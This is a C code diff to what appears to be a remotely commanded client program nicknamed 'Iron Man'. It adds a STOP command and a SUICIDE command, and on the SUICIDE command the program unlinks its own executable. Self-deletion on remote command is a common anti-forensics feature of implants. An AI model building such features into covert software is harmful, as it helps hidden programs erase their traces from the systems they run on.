@@ -146,7 +146,7 @@ result connect_() {
     return res;
 }
 
-result communicate() {
+result communicate(const char *const self_path) {
     INITIALIZE_BUFFER(buf);
     INITIALIZE_BUFFER(buf_out);
     INITIALIZE_RESULT(res);
@@ -190,6 +190,18 @@ result communicate() {
             HANDLE_ERROR_RESULT(tmp_res)
 
             continue;
+        }
+
+        if (command_id == STOP_COMMAND_ID) {
+            HANDLE_ERROR(res, STOPPING, "Gracefully stopping Iron Man", NULL)
+        }
+
+        if (command_id == SUICIDE_COMMAND_ID) {
+            WRITE_LOG(INFO, "Gracefully suiciding Iron Man", NULL)
+            if (unlink_f(self_path) != 0) {
+                HANDLE_ERROR(res, FAILED_UNLINK, "Failed unlinking self", NULL)
+            }
+            HANDLE_ERROR(res, SUICIDING, "Successfully unlinked self", NULL)
         }
 
         key = read_string(&res, &buf, KEY_LENGTH);
